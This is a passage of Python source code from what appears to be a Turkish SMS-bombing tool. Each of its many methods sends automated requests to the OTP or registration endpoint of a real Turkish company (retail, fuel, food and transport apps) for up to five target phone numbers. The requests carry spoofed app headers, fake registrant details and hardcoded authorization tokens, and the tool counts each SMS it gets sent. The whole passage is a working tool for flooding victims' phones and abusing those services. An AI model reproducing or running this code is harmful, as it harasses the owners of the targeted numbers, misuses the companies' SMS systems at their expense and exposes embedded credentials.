                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
                    json={"countryCode": "TR", "phoneNumber": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #buyursungelsin.com
    def Buyur(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #idealdata.com.tr
    def Osmanlideal(self):


        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #pinarsu.com.tr
    def Pinar(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
                    headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
                    json={"MobilePhone": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.text == "true":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #suiste.com
    def Suiste(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://suiste.com:443/api/auth/code"
                    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
                    data = {"action": "register", "gsm": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["code"] == "common.success":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #hayatsu.com.tr
    def Hayat(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
                    json={"mobilePhoneNumber": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["IsSuccessful"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #pisir.com
    def Pisir(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
                    if r.json()["ok"] == "1":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
                
    
    #KimGbIster
    def KimGb(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #ikinciyeni.com
    def IkinciYeni(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["isSucceed"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #terrapizza.com.tr
    def Terra(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
                    json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
                    r = requests.post(url,  json=json)
                    if (r.status_code) == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

            
            
    #ipragaz.com.tr
    def IpraGaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}
                    r = requests.post(url, json=json)
                    if (r.json()["phoneNumber"]) == str(numara):
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ipapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
                    json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}
                    r = requests.post(url, json=json)
                    if (r.json()["messageCode"]) == "OK":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mogazmobilapinew.aygaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue  
            
    #ipragaz.com.tr
    def GoMobile(self):
    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={numara}&isRegistered=true")
                    if (r.json()["data"]["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> gomobilapp.ipragaz.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
                    json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #totalistasyonlari.com.tr
    def Total(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={numara}&api_key=GetDocuments%0A", verify=False)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue            
            
    #opet.com.tr
    def Opet(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.opet.com.tr:443/api/authentication/register"
                    json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(numara), "opetKvkkAndEtk": True, "plate": "31ABC31"}
                    r = requests.post(url, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #dolap.com
    def Dolap(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api-gateway.dolap.com:443/member"
                    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
                    json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
                    r = requests.put(url, headers=headers, json=json)
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #heymobility.tech
    def Hey(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}", headers=headers)
                    if (r.json()["IsSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #tazi.tech
    def Tazi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["kod"]) == "0000":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #isbike.istanbul
    def Isbike(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "http://app.isbike.istanbul:80/api/uye/otpsms"
                    headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.isbike.istanbul "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.isbike.istanbul "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #n11.com
    def N11(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["isSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #joker.com.tr
    def Joker(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
                    data = {"phone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #e-bebek.com
    def Ebebek(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
                    auth = (r.json()["access_token"])
                    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
                    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
                    json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"] == "SUCCESS":
